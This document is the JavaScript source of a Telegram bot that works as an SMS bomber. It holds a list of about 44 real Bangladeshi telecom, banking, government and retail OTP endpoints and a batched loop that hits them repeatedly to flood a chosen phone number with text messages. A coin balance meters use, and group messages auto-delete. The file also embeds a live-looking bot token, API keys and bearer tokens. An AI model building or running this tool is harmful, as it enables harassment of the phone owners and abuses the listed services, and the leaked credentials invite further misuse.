const { Telegraf, session, Markup } = require('telegraf');
const axios = require('axios');
const express = require('express');
const fs = require('fs');

const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
const ADMIN_ID = 5967798239;
const bot = new Telegraf(BOT_TOKEN);

// Database Setup
const DB_FILE = './users.json';
let userData = {};
if (fs.existsSync(DB_FILE)) {
    userData = JSON.parse(fs.readFileSync(DB_FILE));
}

function saveData() {
    fs.writeFileSync(DB_FILE, JSON.stringify(userData, null, 2));
}

// Render dummy server
const app = express();
app.get('/', (req, res) => res.send('Bot Status: Online'));
app.listen(process.env.PORT || 3000);

// API List (Shortened for display, keep your full list here)
const SMS_APIS = [
    { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json', 'Referer': 'https://robiwifi.robi.com.bd/' }, data: p => ({ login: p }) },
    { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login", method: "GET", params: p => ({ msisdn: `880${p}`, lang: "en", ng: "0" }) },
    { url: "https://fundesh.com.bd/api/auth/generateOTP", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p, service_key: "" }) },
    { url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.osudpotro.com/api/v1/users/send_otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: `880${p}` }) },
    { url: "https://gateway.most.gov.bd/auth/oauth/send-otp", method: "POST", headers: { 'Content-Type': 'application/json', 'X-Api-Key': '4rhwlff8q4q860qsb9utv73x12nua8h7' }, data: p => ({ phone: p, name: "User", email: "a@a.com", registration_type: 1, captcha_token: "511fb2f2ed6211d2a471a7af9a0fa140", otp_send: "SMS" }) },
    { url: "https://app.deshal.net/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.shikho.com/auth/v2/send/sms", method: "POST", headers: { 'Content-Type': 'application/json', origin: "https://shikho.com", referer: "https://shikho.com/" }, data: p => ({ phone: "880"+p, type: "student", auth_type: "login", vendor: "shikho" }) },
    { url: "https://api.apex4u.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", method: "GET", params: p => ({ phone: p }) },
    { url: "https://merchant.pathao.com/api/v1/merchants/verification/phone/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile: p }) },
    { url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/register", method: "POST", headers: { 'Content-Type': 'application/json', appsource: "web" }, data: p => ({ name: "Jubair", msisdn: p, email: "j@j.com", gender: "2", password: "@Test1234", confirm_password: "@Test1234", r_token: "test" }) },
    { url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp", method: "GET", params: p => ({ mobile: p }) },
    { url: "https://api.binge.buzz/api/v4/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json', 'x-platform': "web" }, data: p => ({ phone: "+880"+p }) },
    { url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p, intent: "login" }) },
    { url: "https://api-gateway.sundarbancourierltd.com/graphql", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }" }) },
    { url: "https://www.rokomari.com/otp/send", method: "POST", params: p => ({ emailOrPhone: p, countryCode: "BD" }), headers: { 'x-requested-with': "XMLHttpRequest" } },
    { url: "https://offers.sindabad.com/api/mobile-otp", method: "POST", headers: { 'Content-Type': 'application/json', Authorization: "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgbGludXggYW5kcm9pZCAxMyBzbS10ODM3YSBhcHBsZXdlYmtpdDUzNzM2" }, data: p => ({ key: "499a4a6b403417bfd670e45eef1e24b5", mobile: "+88"+p }) },
    { url: "https://piobd.com/login", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `f_mobilenumber=${p}&frf_calculatereg=9` },
    { url: "https://api.shoppingcorner.com.bd/index.php?route=vapi/account/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile_no: p }) },
    { url: "https://chinaonlinebd.com/api/login/getOtp", method: "GET", params: p => ({ phone: p }), headers: { token: "45601f3d391886fcec5f5a3f26780f21" } },
    { url: "https://api.bdtickets.com:20100/v1/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ createUserCheck: true, phoneNumber: "+88"+p, applicationChannel: "WEB_APP" }) },
    { url: "https://auth.acsfutureschool.com/api/v1/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://www.shwapno.com/api/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: "+88"+p }) },
    { url: "https://app.eonbazar.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ method: "otp", mobile: p }) },
    { url: "https://primebazar.com/registration/verification-code-send", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `_token=lCK5AfqQKEpkfPFgzQMNtRx2jD82Yn5fNLrRzmOd&type=customer&phone=${p}&country_code=88` },
    { url: "https://bj-x-coder.top/bo_m_ber.php", method: "GET", params: p => ({ phone: p, amount: 1 }) },
    { url: "https://login.teletalk.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: "880" + p }) },
    { url: "https://api.daraz.com.bd/v1/login/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.evaly.com.bd/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api2.sheba.xyz/v2/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.hungrynaki.com/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.foodpanda.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "+880"+p }) },
    { url: "https://api.10minute.school/api/v1/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.bkash.com/checkout/v1.2.0-beta/login/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://nagad.com.bd/api/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
];

bot.use(session());

// Keyboards
const mainMenu = Markup.keyboard([
    ['🚀 Boom', '💰 Balance'],
    ['🎁 Daily Bonus', 'ℹ️ Info']
]).resize();

// Helper: Auto-delete messages in groups
async function autoDelete(ctx, msgId, delay = 600000) { // Default 10 mins
    if (ctx.chat.type !== 'private') {
        setTimeout(async () => {
            try { await ctx.telegram.deleteMessage(ctx.chat.id, msgId); } catch (e) {}
        }, delay);
    }
}

function registerUser(uid) {
    if (!userData[uid]) {
        userData[uid] = { coins: 50, lastBonus: 0 };
        saveData();
    }
}

// Commands
bot.start(async (ctx) => {
    registerUser(ctx.from.id);
    const msg = await ctx.reply(`👋 স্বাগতম!\nআপনার UID: <code>${ctx.from.id}</code> (কপি করতে ক্লিক করুন)\nনিচের বাটন বা /help কমান্ড ব্যবহার করুন।`, { parse_mode: 'HTML', ...mainMenu });
    autoDelete(ctx, ctx.message.message_id);
    autoDelete(ctx, msg.message_id);
});

bot.command('help', async (ctx) => {
    const helpMsg = `📖 **বট কমান্ড লিস্ট:**\n\n/start - বট শুরু করুন\n/bm <নম্বর> <পরিমাণ> - বোম্বিং শুরু\n/balance - ব্যালেন্স চেক\n/ck - ডেইলি বোনাস\n/info - আপনার তথ্য\n/help - সাহায্য\n\n👤 Admin: @Tnayem48`;
    const msg = await ctx.reply(helpMsg);
    autoDelete(ctx, ctx.message.message_id);
    autoDelete(ctx, msg.message_id);
});

bot.command('balance', async (ctx) => {
    registerUser(ctx.from.id);
    const msg = await ctx.reply(`💰 ব্যালেন্স: ${userData[ctx.from.id].coins} কয়েন`);
    autoDelete(ctx, ctx.message.message_id);
    autoDelete(ctx, msg.message_id);
});

bot.command('ck', async (ctx) => {
    handleBonus(ctx);
});

bot.command('info', async (ctx) => {
    const msg = await ctx.reply(`🆔 আপনার UID: <code>${ctx.from.id}</code>\n👤 Admin: @Tnayem48`, { parse_mode: 'HTML' });
    autoDelete(ctx, ctx.message.message_id);
    autoDelete(ctx, msg.message_id);
});

bot.command('recharge', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply("Usage: /recharge <uid> <amount>");
    const target = args[1];
    const amount = parseInt(args[2]);
    if (!userData[target]) return ctx.reply("User not found!");
    userData[target].coins += amount;
    saveData();
    ctx.reply(`✅ Added ${amount} to ${target}`);
});

bot.command('bm', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply("Usage: /bm 017xxxxxxxx 15");
    startBombing(ctx, args[1], parseInt(args[2]));
});

// Button Handlers
bot.hears('💰 Balance', (ctx) => ctx.reply(`💰 ব্যালেন্স: ${userData[ctx.from.id].coins} কয়েন`));
bot.hears('ℹ️ Info', (ctx) => ctx.reply(`🆔 UID: <code>${ctx.from.id}</code>\n👤 Admin: @Tnayem48`, { parse_mode: 'HTML' }));
bot.hears('🎁 Daily Bonus', (ctx) => handleBonus(ctx));
bot.hears('🚀 Boom', (ctx) => {
    ctx.session = { step: 'get_phone' };
    ctx.reply("📱 নম্বর দিন:");
});

async function handleBonus(ctx) {
    const uid = ctx.from.id;
    registerUser(uid);
    const now = Date.now();
    const diff = (now - (userData[uid].lastBonus || 0)) / (1000 * 60 * 60);
    if (diff >= 24) {
        userData[uid].coins += 100;
        userData[uid].lastBonus = now;
        saveData();
        const msg = await ctx.reply("✅ ১০০ কয়েন বোনাস পেয়েছেন!");
        autoDelete(ctx, ctx.message.message_id);
        autoDelete(ctx, msg.message_id);
    } else {
        ctx.reply(`❌ ${(24 - diff).toFixed(1)} ঘণ্টা পর চেষ্টা করুন।`);
    }
}

bot.on('text', async (ctx) => {
    if (ctx.session?.step === 'get_phone') {
        if (/^01[3-9]\d{8}$/.test(ctx.message.text)) {
            ctx.session.phone = ctx.message.text;
            ctx.session.step = 'get_amount';
            ctx.reply("🔢 পরিমাণ দিন (১-১০০):");
        } else ctx.reply("❌ ভুল নম্বর!");
    } else if (ctx.session?.step === 'get_amount') {
        startBombing(ctx, ctx.session.phone, parseInt(ctx.message.text));
        ctx.session = {};
    }
});

async function startBombing(ctx, phone, amount) {
    const uid = ctx.from.id;
    registerUser(uid);
    if (!/^01[3-9]\d{8}$/.test(phone) || isNaN(amount) || amount <= 0 || amount > 100) {
        return ctx.reply("❌ সঠিক তথ্য দিন (সর্বোচ্চ ১০০)।");
    }
    if (userData[uid].coins < amount) return ctx.reply("❌ পর্যাপ্ত কয়েন নেই!");

    const statusMsg = await ctx.reply(`🚀 কাজ শুরু হয়েছে (${phone})...`);
    
    let success = 0;
    let errors = 0;
    
    // speed optimization: sending 5 requests at a time
    const batchSize = 5;
    let apiIdx = 0;

    while (success < amount) {
        let promises = [];
        for(let i=0; i<batchSize && (success + promises.length) < amount; i++) {
            const api = SMS_APIS[apiIdx % SMS_APIS.length];
            apiIdx++;
            const config = {
                method: api.method, url: api.url, headers: api.headers || {}, timeout: 5000,
                [api.method === 'POST' ? 'data' : 'params']: api.method === 'POST' ? api.data(phone) : api.params(phone)
            };
            promises.push(axios(config).then(() => { success++; }).catch(() => { errors++; }));
        }
        await Promise.all(promises);
        if (apiIdx > 500) break; // Safety break
    }

    userData[uid].coins -= amount;
    saveData();

    const finalMsg = await ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${success}\n⚠️ ব্যর্থ: ${errors}\n💰 বর্তমান ব্যালেন্স: ${userData[uid].coins}`);
    autoDelete(ctx, ctx.message.message_id);
    autoDelete(ctx, statusMsg.message_id);
    autoDelete(ctx, finalMsg.message_id);
}

bot.launch();
